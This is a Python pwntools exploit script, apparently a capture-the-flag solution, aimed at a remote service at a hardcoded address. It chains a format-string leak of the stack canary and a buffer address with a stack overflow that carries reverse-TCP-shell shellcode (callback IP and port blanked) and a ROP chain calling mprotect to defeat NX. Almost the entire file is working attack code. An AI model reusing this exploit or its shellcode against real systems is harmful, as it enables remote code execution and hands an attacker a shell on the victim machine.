#!/usr/bin/python

# Pwntools <3
from pwn import *


# Opening connection to remote server
io = remote('46.101.225.237', 7878)


# Reverse TCP Shell
# Connecting back on my server (obf for obvious reasons)
# Source: http://shell-storm.org/shellcode/files/shellcode-857.php
IP = '\x00\x00\x00\x00'
PORT = '\x00\x00'
shellcode = '\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02'
shellcode+= PORT
shellcode+= '\xc7\x44\x24\x04'
shellcode+= IP
shellcode+= '\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'


# Exploit config
# We are leaking the values of
# * the stack canary, to stack smash without error
# * the 'strchr-like' function return value to help us locate the beginning of our string in memory
DELIM = 'luck!: '   # delimitor in response from server
CANARY = 40         # %<N>$llx for stack canary
STRCHR = 6          # %<N>$llx for the return value of 'strchr-like'


# Start exploit
io.recvuntil(DELIM)

# Payload to leak addresses
payload_leak = '%%%d$.16llx-%%%d$.16llx' % (CANARY, STRCHR)
payload_leak+= '\n'

# Send payload
io.send(payload_leak)

# Parse response from server
CANARY, STRCHR = map(lambda x: int(x, 16), io.recvuntil(DELIM).splitlines()[0].split()[2].split('-'))

# Adapt
STRING_BEGINNING = STRCHR - len(payload_leak)

# Build final payload
# Start with a smooth NOP sled
payload_exploit = '\x90' * 50

# Add a pinch of shellcode
payload_exploit+= shellcode

# Pad it with your best 'a's
payload_exploit+= 'a'*(264-len(payload_exploit))

# Don't forget the canary
payload_exploit+= p64(CANARY)

# Save a little space for old RBP
payload_exploit+= p64(STRING_BEGINNING+0x100)

# Now it's time to ROP
# We are trying to call mprotect on the page that contains
# our shellcode to remove the NX protection
payload_exploit+= p64(0x401946)                                 # POP RDI
payload_exploit+= p64(STRING_BEGINNING & 0xfffffffffffff000)    # Arg0 = page_start(@shellcode)
payload_exploit+= p64(0x401a67)                                 # POP RSI
payload_exploit+= p64(0x1000)                                   # Arg1 = 0x1000 (std page size)
payload_exploit+= p64(0x444836)                                 # POP RDX
payload_exploit+= p64(0x7)                                      # Arg2 = PROT_READ | PROT_WRITE | PROT_EXEC
payload_exploit+= p64(0x441E50)                                 # @gadget_syscall_mprotect
payload_exploit+= p64(STRING_BEGINNING + 20)                    # Return to shellcode, with some security, just in case
payload_exploit+= p64(STRING_BEGINNING + 20)                    # Double the return address, just in case

# Send payload
io.send(payload_exploit+chr(0xa))

# Switch to interactive to prevent connection close
# You just have to send manually 'q' to make the program loop exit and ROP!
io.interactive()
